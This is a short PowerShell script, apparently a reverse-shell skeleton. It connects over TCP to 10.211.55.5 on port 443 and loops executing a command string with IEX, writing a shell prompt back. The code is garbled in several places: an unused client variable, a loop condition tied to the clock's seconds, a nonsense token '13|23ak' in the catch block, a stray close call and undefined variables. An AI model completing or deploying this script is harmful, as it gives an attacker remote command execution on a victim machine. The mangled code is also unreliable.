
$c0p = New-Object System.Net.Sockets.TcpClient
$Port = 443 


$TcpClient = New-Object System.Net.Sockets.TcpClient
$TcpClient.Connect("10.211.55.5", $Port)
$Stream = $TcpClient.GetStream()
$Writer = New-Object System.IO.BinaryWriter($Stream)
$Reader = New-Object System.IO.StreamReader($Stream)


$Buffer = New-Object byte[409600]


While ($f = $(Get-Date).Second % 2 -eq 0) {
    $Cmd = "your command here"
Try {
        IEX $Cmd
        WRitE ($Resp + $pS + '>')
    } catch {
        13|23ak
    } .$cp.Close()
}
